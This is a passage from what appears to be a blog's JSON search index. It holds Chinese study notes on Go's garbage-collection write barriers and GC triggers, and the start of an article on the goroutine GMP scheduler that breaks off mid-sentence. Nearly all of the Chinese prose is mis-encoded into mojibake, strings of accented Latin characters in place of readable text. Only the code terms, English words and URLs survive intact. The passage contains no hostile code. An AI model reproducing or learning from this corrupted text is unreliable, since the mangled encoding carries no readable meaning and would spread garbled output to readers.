æ’å…¥å†™å±éšœï¼šç»“æŸæ—¶éœ€è¦ STW æ¥é‡æ–°æ‰«ææ ˆï¼Œæ ‡è®°æ ˆä¸Šå¼•ç”¨çš„ç™½è‰²å¯¹è±¡çš„å­˜æ´»ï¼›\n- åˆ é™¤å†™å±éšœï¼šå›æ”¶ç²¾åº¦ä½ï¼ŒGC å¼€å§‹æ—¶ STW æ‰«æå †æ ˆæ¥è®°å½•åˆå§‹å¿«ç…§ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šä¿æŠ¤å¼€å§‹æ—¶åˆ»çš„æ‰€æœ‰å­˜æ´»å¯¹è±¡ã€‚\n\nGo V1.8 ç‰ˆæœ¬å¼•å…¥äº†æ··åˆå†™å±éšœæœºåˆ¶ï¼ˆhybrid write barrierï¼‰ï¼Œé¿å…äº†å¯¹æ ˆå†æ¬¡æ‰«æçš„è¿‡ç¨‹ï¼Œæå¤§çš„å‡å°‘äº† STW çš„æ—¶é—´ã€‚ç»“åˆäº†ä¸¤è€…çš„ä¼˜ç‚¹ã€‚\n\n##### 2. æ··åˆå†™å±éšœè§„åˆ™\n\n1ã€GC å¼€å§‹å°†æ ˆä¸Šçš„å¯¹è±¡å…¨éƒ¨æ‰«æå¹¶æ ‡è®°ä¸ºé»‘è‰² (ä¹‹åä¸å†è¿›è¡Œç¬¬äºŒæ¬¡é‡å¤æ‰«æï¼Œæ— éœ€ STW)\n\n2ã€GC æœŸé—´ï¼Œä»»ä½•åœ¨æ ˆä¸Šåˆ›å»ºçš„æ–°å¯¹è±¡ï¼Œå‡ä¸ºé»‘è‰²ã€‚\n\n3ã€è¢«åˆ é™¤çš„å¯¹è±¡æ ‡è®°ä¸ºç°è‰²ã€‚\n\n4ã€è¢«æ·»åŠ çš„å¯¹è±¡æ ‡è®°ä¸ºç°è‰²ã€‚\n\n\n\næœ‰äººï¼Œæ ˆä¸Šä¸€ç›´æ˜¯é»‘è‰²çš„å¯¹è±¡ï¼Œé‚£ä¹ˆä¸å°±æ°¸è¿œæ¸…é™¤ä¸æ‰äº†ä¹ˆã€‚è¿™é‡Œå¼ºè°ƒä¸€ä¸‹ï¼Œæ ‡è®°ä¸ºé»‘è‰²çš„æ˜¯å¯è¾¾å¯¹è±¡ï¼Œä¸å¯è¾¾çš„å¯¹è±¡ä¸€ç›´ä¼šæ˜¯ç™½è‰²ï¼Œç›´åˆ°æœ€åè¢«å›æ”¶ã€‚\n\nGolang ä¸­çš„æ··åˆå†™å±éšœæ»¡è¶³å¼±ä¸‰è‰²ä¸å˜å¼ï¼Œç»“åˆäº†åˆ é™¤å†™å±éšœå’Œæ’å…¥å†™å±éšœçš„ä¼˜ç‚¹ï¼Œåªéœ€è¦åœ¨å¼€å§‹æ—¶å¹¶å‘æ‰«æå„ä¸ª goroutine çš„æ ˆï¼Œä½¿å…¶å˜é»‘å¹¶ä¸€ç›´ä¿æŒï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸éœ€è¦ STWï¼Œè€Œæ ‡è®°ç»“æŸåï¼Œå› ä¸ºæ ˆåœ¨æ‰«æåå§‹ç»ˆæ˜¯é»‘è‰²çš„ï¼Œä¹Ÿæ— éœ€å†è¿›è¡Œå†æ¬¡æ‰«ææ“ä½œäº†ï¼Œå‡å°‘äº† STW çš„æ—¶é—´ã€‚\n\næ··åˆå†™å±éšœæ˜¯ GC çš„ä¸€ç§å±éšœæœºåˆ¶ï¼Œæ‰€ä»¥åªæ˜¯å½“ç¨‹åºæ‰§è¡Œ GC çš„æ—¶å€™ï¼Œæ‰ä¼šè§¦å‘è¿™ç§æœºåˆ¶ã€‚\n\n### 2.6 ä½•æ—¶è§¦å‘ GC\n\n+ ä¸»åŠ¨è§¦å‘ï¼šè°ƒç”¨ runtime.GC()ï¼Œè¿™æ˜¯é˜»å¡å¼çš„ã€‚\n+ è¢«åŠ¨è§¦å‘ç™¾åˆ†æ¯”ï¼šåœ¨å †ä¸Šåˆ†é…å¤§äº 32K byte å¯¹è±¡çš„æ—¶å€™ï¼Œæ£€æµ‹æ­¤æ—¶æ˜¯å¦æ»¡è¶³åƒåœ¾å›æ”¶æ¡ä»¶ï¼Œå¦‚æœæ»¡è¶³åˆ™è¿›è¡Œåƒåœ¾å›æ”¶ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸º 100ï¼Œå³å †å†…å­˜ç›¸æ¯”ä¸Šæ¬¡åƒåœ¾æ”¶é›†å¢é•¿ 100% æ—¶åº”è¯¥è§¦å‘ GC\n\n+ è¢«åŠ¨è§¦å‘å®šæ—¶ï¼š å¦‚æœè¶…è¿‡ä¸¤åˆ†é’Ÿæ²¡æœ‰ GCï¼Œåˆ™è§¦å‘ GCã€‚ç›‘æ§å‡½æ•°æ˜¯ `sysmon()`ï¼Œåœ¨ä¸» goroutine ä¸­å¯åŠ¨ã€‚\n\n# 3. å¤´è„‘é£æš´\n\n+ golang1.3ä¹‹å‰æ˜¯æ ‡è®°æ¸…æ‰«ï¼Œå…ˆæ ‡è®°å†æ¸…æ‰«ï¼Œä¼šSTWï¼Œç¨‹åºåœæ­¢å½±å“æ•ˆç‡ã€‚\n+ golang1.5åŠ å…¥ä¸‰è‰²æ ‡è®°ï¼Œgcå’Œgorutineå¯ä»¥å¹¶å‘ï¼Œä½†æ˜¯ä¹Ÿä¼šSTWã€‚ä¸‰è‰²æ˜¯é»‘ï¼Œç™½ï¼Œç°ã€‚\n+ é¦–å…ˆé»˜è®¤å…¨æ˜¯ç™½è‰²ï¼Œæ ¹èŠ‚ç‚¹æ‰«åˆ°å°±å˜ç°ã€‚åªæ‰«ä¸€å±‚ä¸æ˜¯é€’å½’çš„æ‰«ï¼Œç„¶åå¼€å§‹æ‰«ç°è‰²ï¼ŒæŠŠæ‰«åˆ°çš„ä¹Ÿå˜ç°ï¼Œè‡ªå·±å˜é»‘ã€‚æµç¨‹ä¸€ç›´å¾ªç¯ï¼Œç›´åˆ°å…¨éƒ¨å˜é»‘ã€‚ç™½è‰²çš„è¢«æ¸…ç†ã€‚ï¼ˆç¼ºç‚¹æ˜¯æ‰«çš„æ—¶å€™éœ€è¦STWï¼Œæ‰«å®Œåå†è§£é™¤ï¼‰\n+ æ’å…¥å†™å±éšœï¼šåœ¨GCè¿‡ç¨‹ä¸­ï¼Œæ–°åˆ›å»ºçš„ç›´æ¥ç°è‰²ï¼Œä½†æ˜¯åªåœ¨å †ç©ºé—´ï¼Œç»“æŸåè¿˜è¦å†é‡æ–°æ ‡è®°ä¸€æ¬¡æ ˆç©ºé—´ã€‚\n+ åˆ é™¤å†™å±éšœï¼šåœ¨GCè¿‡ç¨‹ä¸­ï¼Œåˆ é™¤çš„å¦‚æœæ˜¯ç™½è‰²ç›´æ¥å˜ç°è‰²ï¼Œå› ä¸ºå®ƒå¯èƒ½å¼•ç”¨çš„å…¶ä»–ç™½è‰²ï¼Œé˜²æ­¢è¯¯åˆ ã€‚\n+ æ··åˆå†™å±éšœ:  GCåˆšå¼€å§‹ï¼Œæ ˆä¸Šå…¨éƒ¨é»‘è‰²ï¼Œæ·»åŠ å…¨æ˜¯é»‘è‰²ã€‚å †ç©ºé—´åˆ é™¤ä¸ºç°ï¼Œæ·»åŠ ä¹Ÿä¸ºç°ã€‚\n+ ä½•æ—¶è§¦å‘GC:  1: ä¸»åŠ¨è§¦å‘ï¼Œruntime.GC 2ï¼šè¢«åŠ¨è§¦å‘:  åœ¨å †ä¸Šåˆ†é…32KBçš„æ—¶å€™å°±æ£€æŸ¥ä¸Šæ¬¡è¶…è¿‡100% 3: ä¸¤åˆ†é’Ÿä¸€æ¬¡GCã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://learnku.com/articles/68141\n+ https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-garbage-collector/\n+ https://cloud.tencent.com/developer/article/1916989\n+ https://www.cnblogs.com/luozhiyun/p/14564903.html\n+ https://liqingqiya.github.io/golang/gc/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/%E5%86%99%E5%B1%8F%E9%9A%9C/2020/07/24/gc5.html","tags":["gc"],"categories":["2_golangåº•å±‚"]},{"title":"golangçš„GMPè°ƒåº¦æ¨¡å‹","url":"%2Fp%2Fc8d0853c.html","content":"\n# 1. åŸºç¡€æœ¯è¯­\n\n### 1.1 å¹¶å‘å’Œå¹¶è¡Œ\n\n+ å¹¶å‘: ä¸€ä¸ªcpuä¸Šèƒ½åŒæ—¶æ‰§è¡Œå¤šé¡¹ä»»åŠ¡ï¼Œåœ¨å¾ˆçŸ­æ—¶é—´å†…ï¼Œcpuæ¥å›åˆ‡æ¢ä»»åŠ¡æ‰§è¡Œ(åœ¨æŸæ®µå¾ˆçŸ­æ—¶é—´å†…æ‰§è¡Œç¨‹åºaï¼Œç„¶ååˆè¿…é€Ÿå¾—åˆ‡æ¢åˆ°ç¨‹åºbå»æ‰§è¡Œ)ï¼Œæœ‰æ—¶é—´ä¸Šçš„é‡å ï¼ˆå®è§‚ä¸Šæ˜¯åŒæ—¶çš„ï¼Œå¾®è§‚ä»æ˜¯é¡ºåºæ‰§è¡Œï¼‰,è¿™æ ·çœ‹èµ·æ¥å¤šä¸ªä»»åŠ¡åƒæ˜¯åŒæ—¶æ‰§è¡Œï¼Œè¿™å°±æ˜¯å¹¶å‘ã€‚\n\n+ å¹¶è¡Œ: å½“ç³»ç»Ÿæœ‰å¤šä¸ªCPUæ—¶,æ¯ä¸ªCPUåŒä¸€æ—¶åˆ»éƒ½è¿è¡Œä»»åŠ¡ï¼Œäº’ä¸æŠ¢å è‡ªå·±æ‰€åœ¨çš„CPUèµ„æºï¼ŒåŒæ—¶è¿›è¡Œï¼Œç§°ä¸ºå¹¶è¡Œã€‚\n\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/5-å¹¶å‘ä¸å¹¶è¡Œ.jpg\" alt=\"img\" style=\"zoom:67%;\" />\n\n<!-- more -->\n\n### 1.2 è¿›ç¨‹ï¼Œçº¿ç¨‹å’Œåç¨‹\n\n+ **è¿›ç¨‹**: CPU åœ¨åˆ‡æ¢ç¨‹åºçš„æ—¶å€™ï¼Œå¦‚æœä¸ä¿å­˜ä¸Šä¸€ä¸ªç¨‹åºçš„çŠ¶æ€ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„context--ä¸Šä¸‹æ–‡ï¼‰ï¼Œç›´æ¥åˆ‡æ¢ä¸‹ä¸€ä¸ªç¨‹åºï¼Œå°±ä¼šä¸¢å¤±ä¸Šä¸€ä¸ªç¨‹åºçš„ä¸€ç³»åˆ—çŠ¶æ€ï¼Œäºæ˜¯å¼•å…¥äº†è¿›ç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œç”¨ä»¥åˆ’åˆ†å¥½ç¨‹åºè¿è¡Œæ—¶æ‰€éœ€è¦çš„èµ„æºã€‚å› æ­¤è¿›ç¨‹å°±æ˜¯ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶å€™çš„æ‰€éœ€è¦çš„åŸºæœ¬èµ„æºå•ä½ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯ç¨‹åºè¿è¡Œçš„ä¸€ä¸ªå®ä½“ï¼‰ã€‚\n+ **çº¿ç¨‹**: CPU åˆ‡æ¢å¤šä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œä¼šèŠ±è´¹ä¸å°‘çš„æ—¶é—´ï¼Œå› ä¸ºåˆ‡æ¢è¿›ç¨‹éœ€è¦åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œè€Œæ¯æ¬¡è°ƒåº¦éœ€è¦å†…æ ¸æ€éƒ½éœ€è¦è¯»å–ç”¨æˆ·æ€çš„æ•°æ®ï¼Œè¿›ç¨‹ä¸€æ—¦å¤šèµ·æ¥ï¼ŒCPU è°ƒåº¦ä¼šæ¶ˆè€—ä¸€å¤§å †èµ„æºï¼Œå› æ­¤å¼•å…¥äº†çº¿ç¨‹çš„æ¦‚å¿µï¼Œçº¿ç¨‹æœ¬èº«å‡ ä¹ä¸å æœ‰èµ„æºï¼Œä»–ä»¬å…±äº«è¿›ç¨‹é‡Œçš„èµ„æºï¼Œå†…æ ¸è°ƒåº¦èµ·æ¥ä¸ä¼šé‚£ä¹ˆåƒè¿›ç¨‹åˆ‡æ¢é‚£ä¹ˆè€—è´¹èµ„æºã€‚\n+ **åç¨‹**: åç¨‹æ‹¥æœ‰è‡ªå·±çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚åç¨‹è°ƒåº¦åˆ‡æ¢æ—¶ï¼Œå°†å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆä¿å­˜åˆ°å…¶ä»–åœ°æ–¹ï¼Œåœ¨åˆ‡å›æ¥çš„æ—¶å€™ï¼Œæ¢å¤å…ˆå‰ä¿å­˜çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚å› æ­¤ï¼Œåç¨‹èƒ½ä¿ç•™ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶çš„çŠ¶æ€ï¼ˆå³æ‰€æœ‰å±€éƒ¨çŠ¶æ€çš„ä¸€ä¸ªç‰¹å®šç»„åˆï¼‰ï¼Œæ¯æ¬¡è¿‡ç¨‹é‡å…¥æ—¶ï¼Œå°±ç›¸å½“äºè¿›å…¥ä¸Šä¸€æ¬¡è°ƒç”¨çš„çŠ¶æ€ï¼Œæ¢ç§è¯´æ³•ï¼šè¿›å…¥ä¸Šä¸€æ¬¡ç¦»å¼€æ—¶æ‰€å¤„é€»è¾‘æµçš„ä½ç½®ã€‚çº¿ç¨‹å’Œè¿›ç¨‹çš„æ“ä½œæ˜¯ç”±ç¨‹åºè§¦å‘ç³»ç»Ÿæ¥å£ï¼Œæœ€åçš„æ‰§è¡Œè€…æ˜¯ç³»ç»Ÿï¼›åç¨‹çš„æ“ä½œæ‰§è¡Œè€…åˆ™æ˜¯ç”¨æˆ·è‡ªèº«ç¨‹åºã€‚\n\n\n\n# 2. åç¨‹\n\n### 2.1 åç¨‹å¼•å‡ºåŸå› \n\nä¸€ä¸ªçº¿ç¨‹åˆ†ä¸º â€œå†…æ ¸æ€ â€œçº¿ç¨‹å’Œâ€ ç”¨æˆ·æ€ â€œçº¿ç¨‹ã€‚\n\nä¸€ä¸ª â€œç”¨æˆ·æ€çº¿ç¨‹â€ å¿…é¡»è¦ç»‘å®šä¸€ä¸ª â€œå†…æ ¸æ€çº¿ç¨‹â€ï¼Œä½†æ˜¯ CPU å¹¶ä¸çŸ¥é“æœ‰ â€œç”¨æˆ·æ€çº¿ç¨‹â€ çš„å­˜åœ¨ï¼Œå®ƒåªçŸ¥é“å®ƒè¿è¡Œçš„æ˜¯ä¸€ä¸ª â€œå†…æ ¸æ€çº¿ç¨‹â€(Linux çš„ PCB è¿›ç¨‹æ§åˆ¶å—)ã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/TfStmYsfyF.png\" alt=\"8-çº¿ç¨‹çš„å†…æ ¸å’Œç”¨æˆ·æ€.png\" style=\"zoom: 33%;\" />\n\nè¿™æ ·ï¼Œæˆ‘ä»¬å†å»ç»†åŒ–å»åˆ†ç±»ä¸€ä¸‹ï¼Œå†…æ ¸çº¿ç¨‹ä¾ç„¶å« â€œçº¿ç¨‹ (thread)â€ï¼Œç”¨æˆ·çº¿ç¨‹å« â€œåç¨‹ (co-routine)â€.\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/vgzlKzvOUL.png\" alt=\"9-åç¨‹å’Œçº¿ç¨‹.png\" style=\"zoom:33%;\" />\n\n\n\n çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±è¦å¼€è„‘æ´äº†ï¼Œæ—¢ç„¶ä¸€ä¸ªåç¨‹ (co-routine) å¯ä»¥ç»‘å®šä¸€ä¸ªçº¿ç¨‹ (thread)ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½å¤šä¸ªåç¨‹ (co-routine) ç»‘å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªçº¿ç¨‹ (thread) ä¸Šå‘¢ã€‚\n\n\n\n### 2.2 è¿›ç¨‹å’Œåç¨‹ç»‘å®šå…³ç³»\n\n##### N:1 å…³ç³»\n\nN ä¸ªåç¨‹ç»‘å®š 1 ä¸ªçº¿ç¨‹ï¼Œä¼˜ç‚¹å°±æ˜¯åç¨‹åœ¨ç”¨æˆ·æ€çº¿ç¨‹å³å®Œæˆåˆ‡æ¢ï¼Œä¸ä¼šé™·å…¥åˆ°å†…æ ¸æ€ï¼Œè¿™ç§åˆ‡æ¢éå¸¸çš„è½»é‡å¿«é€Ÿã€‚ä½†ä¹Ÿæœ‰å¾ˆå¤§çš„ç¼ºç‚¹ï¼Œ1 ä¸ªè¿›ç¨‹çš„æ‰€æœ‰åç¨‹éƒ½ç»‘å®šåœ¨ 1 ä¸ªçº¿ç¨‹ä¸Šã€‚ä¸€æ—¦æŸåç¨‹é˜»å¡ï¼Œé€ æˆçº¿ç¨‹é˜»å¡ï¼Œæœ¬è¿›ç¨‹çš„å…¶ä»–åç¨‹éƒ½æ— æ³•æ‰§è¡Œäº†ï¼Œæ ¹æœ¬å°±æ²¡æœ‰å¹¶å‘çš„èƒ½åŠ›äº†ã€‚\n\n##### 1:1 å…³ç³»\n\n1 ä¸ªåç¨‹ç»‘å®š 1 ä¸ªçº¿ç¨‹ï¼Œè¿™ç§æœ€å®¹æ˜“å®ç°ã€‚åç¨‹çš„è°ƒåº¦éƒ½ç”± CPU å®Œæˆäº†ï¼Œåç¨‹çš„åˆ›å»ºã€åˆ é™¤å’Œåˆ‡æ¢çš„ä»£ä»·éƒ½ç”± CPU å®Œæˆï¼Œæœ‰ç‚¹ç•¥æ˜¾æ˜‚è´µäº†ã€‚åç¨‹å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚\n\n##### M:N å…³ç³»\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/kfPbThcyRU.png\" alt=\"10-N-1å…³ç³».png\" style=\"zoom: 33%;\" />\n\nåç¨‹è·Ÿçº¿ç¨‹æ˜¯æœ‰åŒºåˆ«çš„ï¼Œçº¿ç¨‹ç”± CPU è°ƒåº¦æ˜¯æŠ¢å å¼çš„ï¼Œåç¨‹ç”±ç”¨æˆ·æ€è°ƒåº¦æ˜¯**åä½œå¼**çš„ï¼Œä¸€ä¸ªåç¨‹è®©å‡º CPU åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ã€‚\n\n\n\n### 2.3 åç¨‹çš„æ„ä¹‰\n\ngoroutineæ˜¯Goè¯­è¨€å®ç°çš„ç”¨æˆ·æ€çº¿ç¨‹ï¼Œä¸»è¦ç”¨æ¥è§£å†³æ“ä½œç³»ç»Ÿçº¿ç¨‹å¤ªâ€œé‡â€çš„é—®é¢˜ï¼Œæ‰€è°“çš„å¤ªé‡ï¼Œä¸»è¦è¡¨ç°åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ï¼š\n\n- åˆ›å»ºå’Œåˆ‡æ¢å¤ªé‡ï¼šæ“ä½œç³»ç»Ÿçº¿ç¨‹çš„åˆ›å»ºå’Œåˆ‡æ¢éƒ½éœ€è¦è¿›å…¥å†…æ ¸ï¼Œè€Œè¿›å…¥å†…æ ¸æ‰€æ¶ˆè€—çš„æ€§èƒ½ä»£ä»·æ¯”è¾ƒé«˜ï¼Œå¼€é”€è¾ƒå¤§ï¼›\n- å†…å­˜ä½¿ç”¨å¤ªé‡ï¼šä¸€æ–¹é¢ï¼Œä¸ºäº†å°½é‡é¿å…æç«¯æƒ…å†µä¸‹æ“ä½œç³»ç»Ÿçº¿ç¨‹æ ˆçš„æº¢å‡ºï¼Œå†…æ ¸åœ¨åˆ›å»ºæ“ä½œç³»ç»Ÿçº¿ç¨‹æ—¶é»˜è®¤ä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªè¾ƒå¤§çš„æ ˆå†…å­˜ï¼ˆè™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå†…æ ¸å¹¶ä¸ä¼šä¸€å¼€å§‹å°±åˆ†é…è¿™ä¹ˆå¤šçš„ç‰©ç†å†…å­˜ï¼‰ï¼Œç„¶è€Œåœ¨ç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç³»ç»Ÿçº¿ç¨‹è¿œè¿œç”¨ä¸äº†è¿™ä¹ˆå¤šå†…å­˜ï¼Œè¿™å¯¼è‡´äº†æµªè´¹ï¼›å¦ä¸€æ–¹é¢ï¼Œæ ˆå†…å­˜ç©ºé—´ä¸€æ—¦åˆ›å»ºå’Œåˆå§‹åŒ–å®Œæˆä¹‹åå…¶å¤§å°å°±ä¸èƒ½å†æœ‰å˜åŒ–ï¼Œè¿™å†³å®šäº†åœ¨æŸäº›ç‰¹æ®Šåœºæ™¯ä¸‹ç³»ç»Ÿçº¿ç¨‹æ ˆè¿˜æ˜¯æœ‰æº¢å‡ºçš„é£é™©ã€‚\n\nç›¸å¯¹çš„ï¼Œç”¨æˆ·æ€çš„goroutineåˆ™è½»é‡å¾—å¤šï¼š\n\n- goroutineæ˜¯ç”¨æˆ·æ€çº¿ç¨‹ï¼Œå…¶åˆ›å»ºå’Œåˆ‡æ¢éƒ½åœ¨ç”¨æˆ·ä»£ç ä¸­å®Œæˆè€Œæ— éœ€è¿›å…¥æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œæ‰€ä»¥å…¶å¼€é”€è¦è¿œè¿œå°äºç³»ç»Ÿçº¿ç¨‹çš„åˆ›å»ºå’Œåˆ‡æ¢ï¼›\n- goroutineå¯åŠ¨æ—¶é»˜è®¤æ ˆå¤§å°åªæœ‰2kï¼Œè¿™åœ¨å¤šæ•°æƒ…å†µä¸‹å·²ç»å¤Ÿç”¨äº†ï¼Œå³ä½¿ä¸å¤Ÿç”¨ï¼Œgoroutineçš„æ ˆä¹Ÿä¼šè‡ªåŠ¨æ‰©å¤§ï¼ŒåŒæ—¶ï¼Œå¦‚æœæ ˆå¤ªå¤§äº†è¿‡äºæµªè´¹å®ƒè¿˜èƒ½è‡ªåŠ¨æ”¶ç¼©ï¼Œè¿™æ ·æ—¢æ²¡æœ‰æ ˆæº¢å‡ºçš„é£é™©ï¼Œä¹Ÿä¸ä¼šé€ æˆæ ˆå†…å­˜ç©ºé—´çš„å¤§é‡æµªè´¹ã€‚\n\n### 2.4 å·¥ä½œåŸç†\n\ngoroutineå»ºç«‹åœ¨æ“ä½œç³»ç»Ÿçº¿ç¨‹åŸºç¡€ä¹‹ä¸Šï¼Œå®ƒä¸æ“ä½œç³»ç»Ÿçº¿ç¨‹ä¹‹é—´å®ç°äº†ä¸€ä¸ªå¤šå¯¹å¤š(M:N) çš„ä¸¤çº§çº¿ç¨‹æ¨¡å‹ã€‚\n\nè¿™é‡Œçš„ M:N æ˜¯æŒ‡Mä¸ªgoroutineè¿è¡Œåœ¨Nä¸ªæ“ä½œç³»ç»Ÿçº¿ç¨‹ä¹‹ä¸Šï¼Œå†…æ ¸è´Ÿè´£å¯¹è¿™Nä¸ªæ“ä½œç³»ç»Ÿçº¿ç¨‹è¿›è¡Œè°ƒåº¦ï¼Œè€Œè¿™Nä¸ªç³»ç»Ÿçº¿ç¨‹åˆè´Ÿè´£å¯¹è¿™Mä¸ªgoroutineè¿›è¡Œè°ƒåº¦å’Œè¿è¡Œã€‚\n\næ‰€è°“çš„å¯¹goroutineçš„è°ƒåº¦ï¼Œæ˜¯æŒ‡ç¨‹åºä»£ç æŒ‰ç…§ä¸€å®šçš„ç®—æ³•åœ¨é€‚å½“çš„æ—¶å€™æŒ‘é€‰å‡ºåˆé€‚çš„goroutineå¹¶æ”¾åˆ°CPUä¸Šå»è¿è¡Œçš„è¿‡ç¨‹ï¼Œè¿™äº›è´Ÿè´£å¯¹goroutineè¿›è¡Œè°ƒåº¦çš„ç¨‹åºä»£ç æˆ‘ä»¬ç§°ä¹‹ä¸ºgoroutineè°ƒåº¦å™¨ã€‚\n\n\n\n\n# 3. GMPè°ƒåº¦æ¨¡å‹\n\n### 3.1 GMP(goroutineï¼Œthreadï¼Œprocessor)\n\nprocessor[å¤„ç†å™¨]ï¼Œå®ƒåŒ…å«äº†è¿è¡Œ goroutine çš„èµ„æºï¼Œå¦‚æœçº¿ç¨‹æƒ³è¿è¡Œ goroutineï¼Œå¿…é¡»å…ˆè·å– Pã€‚P ä¸­è¿˜åŒ…å«äº†å¯è¿è¡Œçš„ G é˜Ÿåˆ—ã€‚\n\nthread æ˜¯è¿è¡Œ goroutine çš„å®ä½“ï¼Œgoroutineè°ƒåº¦å™¨çš„åŠŸèƒ½æ˜¯æŠŠå¯è¿è¡Œçš„ goroutine åˆ†é…åˆ°å·¥ä½œçº¿ç¨‹ä¸Šã€‚\n\n<img src=\"golangçš„GMPè°ƒåº¦æ¨¡å‹/Ugu3C2WSpM.jpeg\" alt=\"16-GMP-è°ƒåº¦.png\" style=\"zoom:67%;\" />\n\n+ å…¨å±€é˜Ÿåˆ—ï¼ˆGlobal Queueï¼‰ï¼šå­˜æ”¾ç­‰å¾…è¿è¡Œçš„ Gã€‚\n+ P çš„æœ¬åœ°é˜Ÿåˆ—ï¼šåŒå…¨å±€é˜Ÿåˆ—ç±»ä¼¼ï¼Œå­˜æ”¾çš„ä¹Ÿæ˜¯ç­‰å¾…è¿è¡Œçš„ Gï¼Œå­˜çš„æ•°é‡æœ‰é™ï¼Œæœ€å¤šå¯å­˜æ”¾256ä¸ªGã€‚æ–°å»º Gâ€™æ—¶ï¼ŒGâ€™ä¼˜å…ˆåŠ å…¥åˆ° P çš„æœ¬åœ°é˜Ÿåˆ—ï¼Œå¦‚æœé˜Ÿåˆ—æ»¡äº†ï¼Œåˆ™ä¼šæŠŠæœ¬åœ°é˜Ÿåˆ—ä¸­ä¸€åŠçš„ G ç§»åŠ¨åˆ°å…¨å±€é˜Ÿåˆ—ã€‚\n+ P åˆ—è¡¨ï¼šæ‰€æœ‰çš„ P éƒ½åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼Œå¹¶ä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œæœ€å¤šæœ‰ GOMAXPROCS(å¯é…ç½®) ä¸ªã€‚\n+ Mï¼š**çº¿ç¨‹æƒ³è¿è¡Œä»»åŠ¡å°±å¾—è·å– Pï¼Œä» P çš„æœ¬åœ°é˜Ÿåˆ—è·å– Gï¼ŒP é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼ŒM ä¹Ÿä¼šå°è¯•ä»å…¨å±€é˜Ÿåˆ—æ‹¿ä¸€æ‰¹ G æ”¾åˆ° P çš„æœ¬åœ°é˜Ÿåˆ—ï¼Œæ‹¿ä¸åˆ°å°±ä»å…¶ä»– P çš„æœ¬åœ°é˜Ÿåˆ—å·ä¸€åŠæ”¾åˆ°è‡ªå·± P çš„æœ¬åœ°é˜Ÿåˆ—ã€‚**M è¿è¡Œ Gï¼ŒG æ‰§è¡Œä¹‹åï¼ŒM ä¼šä» P è·å–ä¸‹ä¸€ä¸ª Gï¼Œä¸æ–­é‡å¤ä¸‹å»ã€‚\n\nGoroutine è°ƒåº¦å™¨å’Œ æ“ä½œç³»ç»Ÿè°ƒåº¦å™¨æ˜¯é€šè¿‡ M ç»“åˆèµ·æ¥çš„ï¼Œæ¯ä¸ª M éƒ½ä»£è¡¨äº† 1 ä¸ªå†…æ ¸çº¿ç¨‹ï¼Œæ“ä½œç³»ç»Ÿè°ƒåº¦å™¨è´Ÿè´£æŠŠå†…æ ¸çº¿ç¨‹åˆ†é…åˆ° CPU çš„æ ¸ä¸Šæ‰§è¡Œã€‚\n\n### 3.2 På’ŒMçš„æ•°é‡\n\nè‡ª Go 1.5å¼€å§‹ï¼Œ Goçš„`GOMAXPROCS`é»˜è®¤å€¼å·²ç»è®¾ç½®ä¸º CPUçš„æ ¸æ•°ï¼Œ è¿™å…è®¸æˆ‘ä»¬çš„Goç¨‹åºå……åˆ†ä½¿ç”¨æœºå™¨çš„æ¯ä¸€ä¸ªCPUã€‚\n\n##### 1. P çš„æ•°é‡\n\nç”±å¯åŠ¨æ—¶ç¯å¢ƒå˜é‡ $GOMAXPROCS æˆ–è€…æ˜¯ç”± runtime çš„æ–¹æ³• GOMAXPROCS() å†³å®šã€‚è¿™æ„å‘³ç€åœ¨ç¨‹åºæ‰§è¡Œçš„ä»»æ„æ—¶åˆ»éƒ½åªæœ‰ $GOMAXPROCS ä¸ª goroutine åœ¨åŒæ—¶è¿è¡Œã€‚\n\n##### 2. M çš„æ•°é‡\n\n+ go è¯­è¨€æœ¬èº«çš„é™åˆ¶ï¼šgo ç¨‹åºå¯åŠ¨æ—¶ï¼Œä¼šè®¾ç½® M çš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤ 10000. ä½†æ˜¯å†…æ ¸å¾ˆéš¾æ”¯æŒè¿™ä¹ˆå¤šçš„çº¿ç¨‹æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªé™åˆ¶å¯ä»¥å¿½ç•¥ã€‚\n\n+ runtime/debug ä¸­çš„ SetMaxThreads å‡½æ•°ï¼Œè®¾ç½® M çš„æœ€å¤§æ•°é‡\n\n+ ä¸€ä¸ª M é˜»å¡äº†ï¼Œä¼šåˆ›å»ºæ–°çš„ Mã€‚\n\nM ä¸ P çš„æ•°é‡æ²¡æœ‰ç»å¯¹å…³ç³»ï¼Œä¸€ä¸ª M é˜»å¡ï¼ŒP å°±ä¼šå»åˆ›å»ºæˆ–è€…åˆ‡æ¢å¦ä¸€ä¸ª 